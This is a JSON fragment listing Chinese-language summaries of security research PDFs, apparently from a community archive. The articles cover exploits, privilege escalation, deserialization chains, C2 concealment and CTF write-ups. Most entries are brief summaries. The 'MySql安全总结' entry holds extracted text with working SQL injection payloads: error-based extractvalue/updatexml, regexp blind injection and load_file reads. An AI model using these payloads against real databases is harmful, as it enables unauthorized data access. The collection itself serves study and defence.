        "page_content": "该文档介绍了 Lerx CMS 中的一个 SSRF 漏洞，该漏洞允许攻击者通过加载包含 shell.jsp 文件的恶意模板来在目标站点上获取 shell。该漏洞是由于在加载模板时未对请求来源进行检查，攻击者可以利用这一点通过远程加载模板文件来实现 GetShell。",
        "FileName": "8179-Lerx从SSRF到GetShell.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用 MCMS 5.3.1 中的模板注入漏洞，通过修改系统设置中的模板文件，绕过文件后缀检查，写入恶意 FreeMark 模板文件，并利用该漏洞实现远程代码执行和跨目录文件删除。",
        "FileName": "12820-MCMS 5.3.1 模板注入挖掘.pdf"
    },
    {
        "page_content": "该文档记录了对记某资产管理业务支撑平台的渗透测试过程。测试人员通过弱口令登录后台，发现文件上传漏洞，并成功上传恶意文件。随后，他们通过修改系统参数配置，将导出模版路径修改为根目录，成功解析恶意文件并获取webshell。",
        "FileName": "10576-记某资产管理业务支撑平台渗透测试.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2013-2551 漏洞，该漏洞影响 Microsoft Internet Explorer 6-10，允许远程代码执行。该漏洞是由 VGX.dll 中 COALineDashStyleArray::put_length 函数处理 length 数据时未进行有效验证引起的，导致整数溢出。攻击者可以利用此漏洞在目标系统上执行任意代码。",
        "FileName": "9237-Internet Explorer漏洞分析(二)——CVE-2013-2551.pdf"
    },
    {
        "page_content": "本文介绍了漏洞研究行业的基础知识，包括漏洞的概念、漏洞的发现和报告流程，以及漏洞的跟踪和管理。它强调了负责任的安全漏洞披露的重要性，并解释了 CVE 编号和 NVD 在漏洞跟踪中的作用。",
        "FileName": "12437-容器世界中的漏洞研究.pdf"
    },
    {
        "page_content": "本文档主要介绍了如何绕过宝塔的 RASP 和 disable_functions，通过劫持 GOT 表来执行任意代码。该方法利用了 ELF 文件的结构，通过修改 GOT 表中 open 函数的地址，使其指向攻击者准备的 shellcode，从而绕过 RASP 的拦截并执行 shellcode。",
        "FileName": "7990-针对宝塔的RASP及其disable_functions的绕过.pdf"
    },
    {
        "page_content": "文档\n```",
        "FileName": "12799-python逆向总结.pdf"
    },
    {
        "page_content": "该文档详细描述了作者在众测项目中通过分析前端代码、收集信息、获取第三方 docker 镜像服务账号密码，最终成功获取源码并发现漏洞的过程。作者强调了识别现代化系统中第三方组件和利用 GitHub 搜索泄露信息的思路，并分享了利用 fastjson、jwt 弱密钥和 xxe 等漏洞进行攻击的技巧。",
        "FileName": "8386-记一次众测找源码到RCE.pdf"
    },
    {
        "page_content": "该文档讲述了一次曲折的渗透经历，渗透者通过分析旧网站源码发现webshell，并利用webshell添加管理员账号，但由于网站没有写⼊权限，无法上传webshell。后来，渗透者联系了网站开发人员，通过数据库修改了写⼊权限，最终成功上传webshell，获得了网站权限。",
        "FileName": "11222-记一次曲折的渗透经历.pdf"
    },
    {
        "page_content": "该文档介绍了 DVWA 靶场中的 SQL 注入漏洞，包括低、中、高和不可能级别。它详细解释了如何利用这些漏洞，包括判断注入类型、回显点和查询数据库信息。文档还强调了 Impossible 级别代码如何通过 PDO 技术和 Anti-CSRF 令牌机制有效防御 SQL 注入。",
        "FileName": "12040-DVWA靶场之SQL Injection学习分享.pdf"
    },
    {
        "page_content": "该文档详细介绍了在三层内网环境中进行域渗透的步骤，包括利用漏洞、横向移动、信息收集和提权，最终目标是拿下域控制器。",
        "FileName": "12259-三层内网下的域渗透.pdf"
    },
    {
        "page_content": "Nexus Repository Manager 3 中的 CVE-2018-16621 和 CVE-2020-10204 漏洞利用 EL 表达式注入来实现远程代码执行，影响版本为 Nexus Repository Manager OSS/Pro 3.x - 3.13，修复版本为 3.14，风险等级为高，权限要求为管理员账户。",
        "FileName": "8319-Nexus Repository UserComponent远程代码执行漏洞浅析(CVE-2018-16621&CVE-2020-10204).pdf"
    },
    {
        "page_content": "该文档分析了 libinjection 库中的语义分析绕过，该库用于检测 SQL 注入攻击。文档解释了绕过是如何通过将输入转换为不同的模式来实现的，从而绕过库的检测。绕过涉及将输入转换为无符号标准 SQL 模式，然后转换为单引号标准 SQL 模式，最后转换为注释模式，从而允许执行 SQL 查询。",
        "FileName": "8257-libinjection 语义分析通用绕过分析.pdf"
    },
    {
        "page_content": "该文档总结了域内横向移动攻击中利用 Kerberos 协议和服务主体名称 (SPN) 的技术，包括 Kerberoasting、票据重写、委派和基于资源的约束委派。这些技术允许攻击者在域内提升权限并访问敏感数据。",
        "FileName": "10541-域内相关协议与横向方法总结（二）.pdf"
    },
    {
        "page_content": "本文介绍了 PHP 代码审计的流程和方法，包括了解目录结构、从入口文件获取信息、挖掘漏洞和利用工具。通过分析 BlueCMS1.6 源代码，作者展示了如何识别 SQL 注入、任意文件删除和反射型 XSS 等漏洞，并强调了灰盒测试在代码审计中的重要性。",
        "FileName": "7992-PHP代码审计之旅.pdf"
    },
    {
        "page_content": "本文档主要介绍了 ThinkPHP V6.0.x 反序列化漏洞的利用方法。该漏洞利用了 ThinkPHP 中的 unserialize() 函数，当参数可控时，即可触发该漏洞。通过构造 POP 链，可以触发任意类的 __toString() 方法，从而实现任意代码执行。利用该漏洞需要绕过 ThinkPHP 中的多个 if 语句，并设置特定的属性值。最终，可以通过构造 payload 并执行反序列化操作来利用该漏洞。",
        "FileName": "9546-学习 ThinkPHP V6.0.x 反序列化链挖掘.pdf"
    },
    {
        "page_content": "CVE-2017-5123 漏洞存在于 Linux 内核的 waitid 系统调用中，该调用用于获取子进程状态改变。由于 waitid 在向 infop 中写入数据时未检查其地址，攻击者可以传入内核空间中的地址，从而非法向内核空间写入数据。该漏洞影响 Linux v4.13~4.14-rc5 版本，已在 Linux v4.14-rc5 和 Linux v4.14.1 中修复。",
        "FileName": "11369-CVE-2017-5123 waitid 漏洞分析及复现.pdf"
    },
    {
        "page_content": "该文档介绍了两个渗透测试中发现的漏洞，这些漏洞利用了文件上传功能中的安全缺陷，导致攻击者可以通过上传恶意文件来获取系统权限。第一个漏洞涉及任意文件读取，攻击者可以通过构造URL参数来读取敏感文件，例如/etc/passwd。第二个漏洞涉及文件上传，攻击者可以通过上传包含恶意代码的图像文件来获取shell权限。",
        "FileName": "7024-渗透测试tips：两处有趣的文件上传到getshell.pdf"
    },
    {
        "page_content": "本文档介绍了 HTTP 请求走私漏洞，该漏洞通常在赏金项目中被忽视。通过使用 Burp 插件，可以自动化挖掘此漏洞的过程。HTTP 请求走私发生在前后端服务器对用户请求边界不一致时，攻击者可以利用这种不一致修改 HTTP 请求，从而获取未授权数据或接管应用程序。Burp 插件 HTTP Request Smuggler 可以帮助自动检测此漏洞，在 Burp Suite 主动扫描中也可以检测到。",
        "FileName": "9859-利用Burp插件挖掘HTTP请求走私.pdf"
    },
    {
        "page_content": "该文档探讨了 Windows 内核中的页面机制，包括物理地址到虚拟地址空间的映射、自引用条目技术以及 Windows 中的页面机制实现。它还提供了在 Windows 7 32 位和 Windows 10 64 位上验证这些机制的实验结果，并讨论了这些机制在漏洞利用中的潜在影响。",
        "FileName": "8392-Abusing  Windows Physical.pdf"
    },
    {
        "page_content": "phpBB v3.2.3 及更早版本中存在一个远程代码执行漏洞 (CVE-2018-19274)，该漏洞是由控制管理面板设置路径的 $_REQUEST['config'] 参数过滤不严格和 switch 语句不严谨引起的。攻击者可以通过社会工程、弱口令或钓鱼等方式获得控制管理面板权限，然后上传恶意附件，再进入后台控制管理面板利用设置中对路径的验证功能，结合 PHP phar 反序列化进行 php 对象注入，构造可用的恶意攻击链，获取 Webshell。",
        "FileName": "8239-phpBB Phar反序列化远程代码漏洞分析(CVE-2018-19274).pdf"
    },
    {
        "page_content": "该文档详细介绍了渗透测试一个综合靶场 vulntarget-a 的过程，包括利用永恒之蓝漏洞获取 shell、建立路由、进行内网渗透、利用 Zerologon 漏洞攻击域控、横向移动等步骤，最终成功控制了域控。",
        "FileName": "12422-渗透靶场——vulntarget-a综合靶场.pdf"
    },
    {
        "page_content": "Python 反序列化漏洞涉及使用 pickle 模块将 Python 对象序列化为字节流，然后反序列化为原始对象。漏洞源于可以将自定义类序列化和反序列化，反序列化后触发 __reduce__() 魔术方法，从而执行恶意代码。攻击者可以通过在反序列化对象中包含恶意代码来利用此漏洞。",
        "FileName": "11082-Python反序列化漏洞分析.pdf"
    },
    {
        "page_content": "该文档探讨了 Java 安全中 Groovy 组件从反序列化到命令注入的攻击路径，并介绍了在白盒环境中排查此类漏洞的方法。它分析了 Groovy 组件中关键类和函数的特征，并提供了绕过 Groovy 沙箱和执行恶意代码的技巧。",
        "FileName": "12015-Java安全中Groovy组件从反序列化到命令注入及绕过和在白盒中的排查方法.pdf"
    },
    {
        "page_content": "该文档分析了 DzzOffice 某 Office2.02 前台 RCE 漏洞，该漏洞源于安装过程中随机数种子的固定定位，导致攻击者可以通过爆破随机数种子来获取 authkey，进而利用加密参数进行 RCE。漏洞的产生点在 install/index.php 文件，该文件在安装后会被删除，但攻击者可以通过分析 Discuz 的历史漏洞来寻找类似的漏洞。",
        "FileName": "11569-某Office2.02前台RCE分析.pdf"
    },
    {
        "page_content": "**文档主题：** XStream 漏洞分析与利用\n\n**文档内容：**\n\nXStream 是一个 Java 库，用于在 Java 对象和 XML 之间进行转换。它存在多个漏洞，可导致远程代码执行、反序列化漏洞和 JNDI 注入。本文档分析了这些漏洞，并提供了利用示例。\n\n**输出结果：**\n\nXStream 是一个 Java 库，用于在 Java 对象和 XML 之间进行转换。它存在多个漏洞，可导致远程代码执行、反序列化漏洞和 JNDI 注入。本文档分析了这些漏洞，并提供了利用示例。",
        "FileName": "12784-Java安全之XStream漏洞分析与利用.pdf"
    },
    {
        "page_content": "该文档详细介绍了 CISCN 2023 西北赛区 PWN 部分的解题思路，重点分析了其中一道题目的命令注入漏洞。解题思路包括定位 system 调用、考虑命令注入漏洞、限制 new[] 大小、利用堆块未清空和 filterCommand 函数缺陷构造 EXP 等。",
        "FileName": "12650-记一次CISCN 2023 西北赛区 PWN 部分题解.pdf"
    },
    {
        "page_content": "**主题：** 短信身份验证的安全风险\n\n**内容：** 文档分析了短信身份验证的各种安全风险，包括账户接管、用户模拟、短信轰炸、资源枯竭、验证码发送次数限制、错误次数限制、用户封锁、短信嗅探等。它还提供了针对这些风险的防御措施，例如使用不可预测的验证码、限制身份验证尝试次数、使用多因素身份验证等。",
        "FileName": "7638-短信身份验证的安全风险.pdf"
    },
    {
        "page_content": "该文档详细介绍了 macOS 中内存分配的 libcmalloc 模式，重点关注 tiny、small 和 large 堆块的分配和释放机制，包括它们的结构、元数据、freelist 和分配算法。",
        "FileName": "9308-macos 内存分配学习笔记.pdf"
    },
    {
        "page_content": "该文档分析了智能合约中 call 函数的漏洞，称为 evilReflex 漏洞。该漏洞允许攻击者通过 call 函数将存在该漏洞的合约中的任意数量的 token 转移到任意地址，影响范围包括多个 ERC233 标准智能合约。文档详细介绍了漏洞的原理、预备知识、真实案例分析和复现步骤，并强调了在开发过程中避免不当使用 call 函数的重要性。",
        "FileName": "9898-浅谈智能合约evilReflex漏洞.pdf"
    },
    {
        "page_content": "该文档分析了几个 CMS 中存在的路径穿越漏洞，包括任意文件读取和删除、任意文件下载以及任意文件删除。这些漏洞允许攻击者访问或修改未经授权的文件，从而对系统造成损害。",
        "FileName": "10932-几处cms路径穿越.pdf"
    },
    {
        "page_content": "该文档分析了 Drupal SA-CORE-2019-010 漏洞，该漏洞允许通过第三方模块上传 .htaccess 文件。漏洞的根源在于文件上传验证不严格，导致可以上传以 . 开头的文件。通过分析 Drupal 核心代码和第三方模块，文档确定了漏洞点并提供了修复方法。",
        "FileName": "7106-Drupal SA-CORE-2019-010 .开头文件名(如.htaccess) 文件上传.pdf"
    },
    {
        "page_content": "这篇文档主要介绍了Java反序列化漏洞的攻击流程，并以commons-collections-3.1 jar包为例，详细分析了漏洞的利用链和触发条件。文章还介绍了JDK1.7中AnnotationInvocationHandler类的readObject复写点，并分析了为什么只有当map中key为\"value\"时才能触发漏洞。",
        "FileName": "7031-JAVA反序列化 - Commons-Collections组件.pdf"
    },
    {
        "page_content": "该文档分析了 JBoss 中的两个反序列化漏洞（CVE-2015-7501 和 CVE-2017-12149），这些漏洞允许攻击者通过 JMXInvokerServlet 执行任意代码。文档提供了漏洞的原理、利用方法和实战示例，并强调了使用反弹流量来获得稳定的 shell 访问。",
        "FileName": "9468-jboss之JMXInvokerServlet反序列化漏洞分析利用.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Windows 系统中的提权技术，包括利用系统漏洞、数据库提权、启动项提权、MSSQL 提权、Oracle 提权、GetSystem 相关脚本、BypassUAC、内核提权、假冒令牌和窃取令牌等方法。",
        "FileName": "9017-Windows Privilege Escalation.pdf"
    },
    {
        "page_content": "本文探讨了父进程欺骗技术，该技术允许红队将恶意进程伪装成合法进程的子进程，从而绕过检测。本文介绍了多种实现父进程欺骗的工具和技术，包括使用 Windows API \"CreateProcess\"、C#、PowerShell 和 VBScript。这些技术可以用于提升权限、加载任意 DLL 或执行任意有效负载，从而使攻击者能够在目标系统上获得立足点。",
        "FileName": "8387-父进程欺骗技术.pdf"
    },
    {
        "page_content": "该文档分析了某软件监控页面中的远程命令执行 (RCE) 漏洞。该漏洞允许攻击者通过向后台监控页面发送精心设计的请求来执行任意命令。漏洞的根源在于后台代码对输入参数处理不当，导致命令执行。补丁通过删除有问题的代码段来修复此漏洞。文档提供了漏洞的详细分析，包括漏洞说明、修复原理和漏洞复现步骤。",
        "FileName": "11778-某软件监控页面RCE漏洞分析.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 Tenda AC15 固件中的栈溢出漏洞，并提供了利用该漏洞的详细步骤。该漏洞存在于 R7WebsSecurityHandler 函数中，由于未对用户输入进行合理性检查，导致栈溢出。利用该漏洞需要满足特定条件，包括访问不存在的路径和输入垃圾数据。文档还提供了利用该漏洞的 Python 脚本，并介绍了如何查找 gadget 和构造利用 payload。",
        "FileName": "12793-tenda固件栈溢出漏洞挖掘和iot常用工具介绍和使用.pdf"
    },
    {
        "page_content": "SSRF（服务器端请求伪造）漏洞是一种安全漏洞，攻击者可以利用它构造由服务端发起的请求，从而攻击内网应用。SSRF 漏洞的成因通常是服务端提供了从其他服务器获取数据的功能，且没有对目标地址进行过滤和限制。攻击者可以通过利用存在缺陷的 Web 应用作为代理，攻击远程和本地的服务器，甚至可以下载内网资源。",
        "FileName": "7405-SSRF漏洞的利用与攻击内网应用实战.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 SSRF 漏洞和 MySQL 容器来获取 MySQL 数据库中的数据。攻击者通过构造一个经过 URL 编码的原始数据包，并将其发送到 MySQL 容器，从而绕过安全检查并访问数据库。通过分析数据包，攻击者可以获得数据库的用户名和密码，并进一步获取数据库中的数据。",
        "FileName": "12218-CTFer成长之路之SSRF漏洞.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2018-8453 漏洞，该漏洞是一个 UAF 类型的漏洞，它允许攻击者通过控制窗口对象销毁时在 xxxFreeWindow 函数中回调 fnDWORD 的 hook 函数，从而实现对 pSBTrack 的 Double Free。文档详细分析了漏洞成因、触发过程和利用姿势，并提供了缓解措施。",
        "FileName": "8614-CVE-2018-8453 Win32k漏洞分析笔记.pdf"
    },
    {
        "page_content": "文档分析了 Ethernaut 题解 2022 版（上）中的 12 道题，详细解释了每道题的漏洞原理和攻击步骤，涵盖了合约重入、整数溢出、逻辑漏洞等常见漏洞类型，有助于理解以太坊智能合约的安全问题。",
        "FileName": "11059-Ethernaut题解2022版（上）.pdf"
    },
    {
        "page_content": "该文档描述了一个代码审计过程，从一个鸡肋的 SSRF 漏洞开始，通过利用请求模块的 30X 跳转特性，将其升级为一个可控路由和参数的 GET 类型 SSRF。随后，通过发现一个可控文件名的文件上传漏洞，最终将 SSRF 漏洞升级为 RCE，实现了对本地服务的攻击。",
        "FileName": "9923-记一次从鸡肋SSRF到RCE的代码审计过程.pdf"
    },
    {
        "page_content": "本文分析了 JavaScript 原型链污染攻击，解释了原型、原型链和原型链污染机制，并提供了利用手段和例题分析，强调了原型链污染攻击在 JavaScript 中的危险性，以及如何利用它进行攻击。",
        "FileName": "7182-浅析javascript原型链污染攻击.pdf"
    },
    {
        "page_content": "该文档详细介绍了红队攻防实战中，如何通过免杀木马、内网渗透、提权、漏洞利用等技术，从外网渗透到内网，并最终获取域内所有机器的权限。",
        "FileName": "10481-红队攻防实战系列一之msf.pdf"
    },
    {
        "page_content": "该文档介绍了 Frida 和 Brida 的使用，包括 Frida 的安装、使用和 HOOK 脚本编写，以及 Brida 插件的安装、配置和使用。Brida 插件通过 RPC 方式调用 Frida HOOK 函数，可以对应用程序进行 HOOK 并输出到 BurpSuite 界面，用于解密请求包和加密响应包。",
        "FileName": "8461-Frida及Brida学习记录.pdf"
    },
    {
        "page_content": "该文档详细介绍了作者如何发现 Weblogic T3 RCE 漏洞，包括三个案例的分析。作者通过研究历史 CVE 和补丁，寻找二阶反序列化点，并开发自己的反序列化工具，最终发现了三个绕过黑名单的反序列化链，导致远程代码执行。",
        "FileName": "9068-How Did I Find Weblogic T3 RCE.pdf"
    },
    {
        "page_content": "该文档介绍了如何对 semcms 网站进行基于时间的盲注攻击。攻击者利用了 web_inc.php 文件中未正确过滤的输入，通过构造特殊的 payload，可以从数据库中获取信息，例如数据库名称和用户名。",
        "FileName": "7122-semcms代码审计：基于时间的盲注.pdf"
    },
    {
        "page_content": "本文探讨了 Linux 平台上的 Rootkit，一种高度隐蔽且持久的威胁。它分析了用户态 Rootkit 在网络犯罪组织中的广泛使用，以及内核态 Rootkit 的高度定制化需求。此外，本文还介绍了其他类型的 Linux Rootkit，并从攻防角度对 Rootkit 进行了总结。",
        "FileName": "11124-【Rootkit系列研究】Linux平台的高隐匿、高持久化威胁.pdf"
    },
    {
        "page_content": "该文档介绍了一种半通用的 Tomcat 回显方法，该方法通过修改 Tomcat 中的变量来获取当前请求的响应对象，从而在响应中附加执行结果，绕过某些防护和限制。该方法适用于 Tomcat 中的 Controller 逻辑，但由于某些过滤器在缓存请求之前执行代码，因此不适用于所有场景。",
        "FileName": "7348-Tomcat中一种半通用回显方法.pdf"
    },
    {
        "page_content": "该文档记录了一次利用SSRF漏洞获取目标服务器真实IP，并通过IP反查找到旁站，最终通过弱口令攻破旁站，进而跨站拿下目标主站的过程。",
        "FileName": "9371-记一次SSRF-getshell.pdf"
    },
    {
        "page_content": "该文档介绍了如何使用 Xray 渗透测试工具与 BurpSuite 联动自动扫描 DVWA 靶机，包括普通版和高级版的区别、简易使用方法、Xray 与 Burp 联动、DVWA 各个功能测试、Xray 扫描结果与总结等内容。",
        "FileName": "7968-xray联动BurpSuite自动扫描dvwa靶机渗透测试.pdf"
    },
    {
        "page_content": "本文介绍了三种木马上线的隐藏方法：DNS上线、CDN上线和云函数上线。DNS上线利用DNS协议建立C2通信，隐蔽性强但传输速度慢；CDN上线利用CDN服务器的IP隐藏真实IP，但传输内容未加密；云函数上线利用Serverless架构，通过云函数转发流量到C2服务器，速度较快且可隐藏C2服务器IP。",
        "FileName": "9732-CobaltStrike上线隐藏.pdf"
    },
    {
        "page_content": "该文档宣布了先知社区举办的 CVE 漏洞分析长期悬赏活动，要求参与者分析最新公开的严重或高危 CVE 漏洞，重点关注 Spring Framework、Shiro、Apache 和 VMware 等流行软件或组件。活动要求提交原创分析，包括漏洞影响的软件版本、成因、有问题的代码段和利用成功证明截图。符合要求的提交将获得 300-1000 元的奖金。",
        "FileName": "12394-先知社区CVE漏洞分析长期悬赏.pdf"
    },
    {
        "page_content": "该文档介绍了如何在内网环境中使用 DNS 隧道建立与外部的连接，并提供了详细的搭建过程和客户端下载地址。通过在 VPS 上部署域名解析和安装 dnscat2 服务端，用户可以在客户端通过 dnscat2 连接到服务端，建立一个通过 DNS 协议进行流量交互的隧道，从而绕过网络防火墙的限制。",
        "FileName": "7817-DNS隧道搭建及反弹shell之脱坑.pdf"
    },
    {
        "page_content": "该文档讨论了在 WebSocket 下进行安全测试，重点关注一个授权应用程序中发现的任意文件上传漏洞。该漏洞允许攻击者通过控制上传文件位置来上传恶意文件，并最终通过上传定时任务获取服务器权限。文档还提到了使用 authorization 授权来防止 XSS 攻击。",
        "FileName": "10376-WebSocket下安全测试.pdf"
    },
    {
        "page_content": "该文档总结了绕过文件上传 Web 应用程序防火墙 (WAF) 的各种方法，包括硬怼和迂回打击两种思路。硬怼方法包括修改 HTTP 头部变量、构造文件后缀、利用操作系统特性等；迂回打击方法则包括利用 HTTP 特性、寻找真实 IP、利用子域名绕过等。",
        "FileName": "10515-文件上传绕过思路总结.pdf"
    },
    {
        "page_content": "这篇文档讨论了 Windows 本地权限提升中的可写系统路径漏洞，该漏洞是由系统路径环境变量中可写目录引起的。攻击者可以通过识别以 SYSTEM 身份运行并尝试加载不存在的 DLL 的服务来利用此漏洞，从而将自己添加到本地管理员组或在特权服务上下文中执行远程管理工具。",
        "FileName": "12703-红队本地权限提升-“可写SYSTEM路径权限提升，第一部分.pdf"
    },
    {
        "page_content": "该文档详细介绍了 BossCMSV1.0 中的多个安全漏洞，包括后台任意文件上传、下载和删除、未授权任意文件上传和用户操作，以及敏感信息泄露。这些漏洞主要是由于访问控制体系崩塌，导致后台功能在未登录状态下也能访问。",
        "FileName": "10804-某CMSV1.0代码审计.pdf"
    },
    {
        "page_content": "1.登录 MySql 安全总结 k0e1y   /  2022-12-01 17:29:58  /  发表于⼭东  /  浏览数  10593 mysql 是⽬前⽤处最⼴泛数据库之⼀，作为安全从业者，详细系统的了解它的问题很有必要 MySQL  是⼀个关系型数据库管理系统，由瑞典  MySQL AB  公司开发，⽬前属于  Oracle  公司。 MySQL  是⼀种关联数据库管理系 统， MySQL  的  SQL  语⾔是⽤于访问数据库的最常⽤标准化语⾔。 MySQL  软件采⽤了双授权政策，它分为社区版和商业版，⼀般 中⼩型⽹站的开发选择  MySQL  作为⽹站数据库。 information_schema MySQL ⾃带的系统数据库，当中⼤部分是我们需要了结的信息，⽐如字符集，权限相关，数据库实体对象信息，外检约束，分 区，压缩表，表信息，索引信息，参数，优化，锁和事物等等。所以可以利⽤这个数据库来进⾏注⼊。 -- 存储 mysql 数据库下⾯的所有表名信息的表 information_schema . tables \t\t\t\t -- 数据库名 \t:\ttable_schema \t\t\t\t -- 表名 \t:\tTable_name --\t存储 mysql 数据库下⾯的所有列名信息的表 information_schema . columns \t\t\t\t --\t 表名 \t:\ttable_name 常⻅系统函数和变量 version() -- MySQL 版本 user() --  数据库⽤户名 database() --  数据库名 @@datadir --  数据库路径 @@basedir --  安装路径 @@version_compile_os --  操作系统版本 字符连接函数 concat(str1,str2,...) 将字符串拼接 concat_ws(separator,str1,str2,...) 将字符串有间隔的拼接 group_concat(str1,str2,...) 将字符串拼接，但是间隔⼀个逗号 截取字符串函数 mid() 此函数为截取字符串⼀部分。 前⾔ 介绍 Mysql  基础MID(column_name,start[,length]) --\tcolumn_name\t\t:\t 必需。要提取字符的字段。\n2.--\t start\t\t\t\t\t\t\t\t:\t 必需。规定开始位置（起始值是 \t1 ）。 --\tlength\t\t\t\t\t\t\t:\t 可选。要返回的字符数。如果省略，则 \tMID()\t 函数返回剩余⽂本。 例如  : str=\"abc\" mid(str,2,1)  结果为 b substr() Substr()  和  substring()  函数实现的功能是⼀样的，均为截取字符串。 string\tsubstring(string,\tstart,\tlength) string\tsubstr(string,\tstart,\tlength) --\t 参数描述同 \tmid()\t 函数，第⼀个参数为要处理的字符串， start\t 为开始位置， length\t 为截取的⻓度。 Left() 得到字符串左部指定个数的字符 Left(\tstring,\tn\t) --\tstring\t 为要截取的字符串， n\t 为⻓度。 ⽂件读取函数 load_file() load_file() ：以⽂本⽅式读取⽂件，在  Windows  中，路径设置为  \\ 读取⽂件并返回该⽂件的内容作为⼀个字符串。 例如： select1,1,1,load_file(char(99,58,47,98,111,111,116.105,110,105)) 最简单的单引号   双引号   括号闭合   联合查询就不在这⾥说了 并且 post cookie 注⼊  http 头注⼊不会在这⾥出现，因为本质和 get 都相同 何为盲注？   盲注就是在  sql  注⼊过程中，  sql  语句执⾏的选择后，   选择的数据不能回显到前端⻚⾯。   此时，   我们需要利⽤⼀些⽅ 法进⾏判断或者尝试，   这个过程称之为盲注。我们可以知道盲注分为三类 • 基于布尔  SQL  盲注 • 基于时间的  SQL  盲注 • 基于报错的  SQL  盲注 这是根据⽹⻚是否正常显示来判断 当前数据库是 security sql 注⼊ 盲注 基于布尔  SQL  盲注 left\n3.left 函数：select\tleft(database(),1)>'a';\t// 查询数据库的名字并且获取前⼀个字符和 s 的 ascii 码进⾏⽐较 因为第⼀个字符是 s ⼤于 a  ，结果返回 1 ，否则为 0 如果我们知道第⼀个字符是 s 了，那么查询第⼆个字符就把 1 改为 2 ，这样就变为 se 和 sc 进⾏⽐较，因为 se>sc 所以返回结果为 1 ，这 ⾥第⼀个参数随便输⼊，我们需要的是第⼆个参数   因为匹配到了会返回 1 ，失败会返回空 如何知道匹配结束，⼀般是根据正则表达式变为  FALSE  说明后⾯没有字符了 '^u[a-z]' -> '^us[a-z]' -> '^use[a-z]' -> '^user[a-z]' -> FALSE 但是如果是存在有回显所以使⽤正则类似  like  进⾏匹配 like  匹配注⼊本来⽹⻚是不显示信息的，但是我们可以构造  payload  让信息通过错误提示回显出来 ⾸先介绍⼏个函数 floor 函数：向下取整 rand 函数：随机产⽣ 0-1 之前的随机数 但是如果给他传⼊⼀个固定参数，他就会产⽣⼀个伪随机数，并且数字不变这个随机数就⼀直不变 基于报错的  SQL  盲注 Floor 报错注⼊当我们乘 2 之后要不⼤于 1 要不⼩于 1 ，所以 floor 得出的结果要不是 0 要不是 1 count(*)  返回 group 分组之后的⾏的数量当我们输⼊这条命令 select\t*\tfrom\tusers\twhere\tid=1\tand\t1=(if((user()\tregexp\t'^r'),1,0)); 如果加上 database() select\t*\tfrom\tusers\twhere\tid=1\tand\t1=(if((database()\tregexp\t'^security'),1,0)); 我们发现爆出了数据库 原理分析   ⻅ Mysql 报错注⼊之 floor(rand(0)*2) 报错原理探究 主要原因 count(*) 建⽴虚表计算数量时，因为计算时的 rand 和插⼊时的 rand 数值不同⽽引起的主键冲突从⽽报错，我们将数据库的\n4.名连接，于是就会把我们查询的给报错报出来 同 extractvalue() ：从⽬标 XML 中返回包含所查询值的字符串。 EXTRACTVALUE (XML_document, XPath_string); 第⼀个参数： XML_document 是 String 格式，为 XML ⽂档对象的名称，⽂中为 Doc 第⼆个参数： XPath_string (Xpath 格式的字符串 ) concat: 返回结果为连接参数产⽣的字符串。 payload: and\textractvalue(null,concat(0x7e,(select\tuser()),0x7e)); 第⼀个参数随便输⼊，我们需要的是第⼆个参数   因为匹配到了会返回 1 ，失败会返回空 同样 ceil 函数其实也是取整数，和 floor 函数效果是⼀样的 extractvalue() 函数payload: updatexml(1,concat(0x7e,database(),ceil(rand(0)*2))",
        "FileName": "11910-MySql安全总结.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 Microsoft SQL Server 中受信赖数据库的漏洞来提升权限。通过创建一个受信赖的数据库并授予用户 db_owner 权限，攻击者可以执行存储过程来将自己的权限提升到 sysadmin 级别，从而获得对 SQL Server 实例的完全控制。",
        "FileName": "8188-利用mssql受信用数据库提权.pdf"
    },
    {
        "page_content": "该文档主要讨论了 Liferay Portal JSON Web Service 中的一个未授权反序列化远程代码执行漏洞 (CVE-2020-7961)，该漏洞允许攻击者通过精心构造的恶意数据对 API 接口发起远程代码执行攻击。文档分析了漏洞成因、影响范围、利用方法，并提供了利用 C3P0 和 com.sun.rowset.JdbcRowSetImpl 进行 RCE 的示例代码。",
        "FileName": "7485-浅谈Liferay Portal JSON Web Service未授权反序列化远程代码执行漏洞.pdf"
    },
    {
        "page_content": "C3P0 攻击链分析：该文档分析了 C3P0 攻击链的原理和利用方式，包括 URLClassLoader 远程类加载、JNDI 注入、HEX 序列化字节加载器进行反序列化攻击等技术。攻击链利用了 C3P0 中的漏洞，通过构造恶意对象并进行序列化和反序列化，最终实现远程代码执行。",
        "FileName": "12286-浅析C3P0攻击链.pdf"
    },
    {
        "page_content": "该文档分析了 ThinkPHP6.0 反序列化漏洞，该漏洞允许攻击者通过反序列化恶意数据来执行任意代码。文档详细介绍了漏洞的利用过程，包括绕过安全检查和执行命令注入。",
        "FileName": "12630-ThinkPHP6.0 反序列化漏洞.pdf"
    },
    {
        "page_content": "Go 语言中的模板注入涉及使用 Go 语言的模板包来处理用户输入，如果未正确使用，可能会导致安全漏洞。Go 语言提供了两个模板包：html/template 和 text/template，其中 html/template 专门用于处理 HTML 输出，防止 XSS 攻击。通过使用 html/template 包，模板引擎会对用户输入进行转义，防止恶意代码执行。然而，如果使用 text/template 包，则需要手动对用户输入进行转义，否则可能会导致安全漏洞。",
        "FileName": "12642-Go语言下的模板注入.pdf"
    },
    {
        "page_content": "该文档分析了 Apache Dubbo Hession 反序列化漏洞 (CVE-2022-39198)，该漏洞允许攻击者通过利用 JDK 中的恶意类和 fastjson 库中的任意 getter 方法来执行任意代码。文档重点介绍了利用 sun.print 包中的 UnixPrintServiceLookup 类中的 getDefaultPrintService 方法来触发漏洞，并提供了利用该漏洞的 PoC。",
        "FileName": "11961-CVE-2022-39198 Apache Dubbo Hession Deserialization Vulnerability Gadgets Bypass.pdf"
    },
    {
        "page_content": "该文档分析了 Tcache 缓存投毒技术，该技术利用 glibc 中的 Tcache 特性，通过修改指针指向，实现任意地址写，从而泄露堆内存布局、劫持 GOT 表和绕过 seccomp 限制，最终读取 flag。",
        "FileName": "12600-一文带你理解tcache缓存投毒.pdf"
    },
    {
